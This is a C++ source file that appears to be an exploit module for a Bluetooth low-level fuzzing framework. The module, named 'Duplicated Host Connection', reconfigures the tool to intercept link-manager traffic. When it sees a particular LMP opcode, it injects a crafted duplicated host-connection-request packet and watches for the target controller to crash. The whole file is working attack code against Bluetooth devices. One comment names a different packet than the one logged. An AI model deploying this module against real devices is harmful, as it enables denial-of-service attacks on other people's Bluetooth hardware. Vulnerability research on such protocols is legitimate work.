#include "ModulesInclude.hpp"
#include <stdlib.h>
#include <stdio.h>
#include <inttypes.h>


// Vars
static int tx_count = -1;
static uint malformed_count = 0;

// Setup
static const char *module_name()
{
    return "Duplicated Host Connection";
}

static int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 2000;
    config->options.auto_start = true;
    config->bluetooth.bridge_hci = true;
    config->bluetooth.intercept_tx = true;
    config->bluetooth.lmp_sniffing = true;
    config->bluetooth.rx_bypass = false;
    config->bluetooth.rx_bypass_on_demand = false;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;

    return 0;
}

// TX
static int tx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // Send LMP_start_encryption_request
    if (p && pkt_length >= 5 && ((pkt_buf[4] >> 1) == 51))
    {
        wd_log_y("Sending duplicated LMP_host_connection_request");

        static uint8_t packet[] = {0x99, 0x3,
                                   0xf, 0x0, 0x66, 0xdc};
        module_request_t *m = (module_request_t *)p;
        m->tx_count = 1;
        m->pkt_buf = packet;
        m->pkt_len = sizeof(packet);
        m->stop_on_crash = 1;
    }

    return 0;
}

// RX
static int rx_pre_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}

static int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    return 0;
}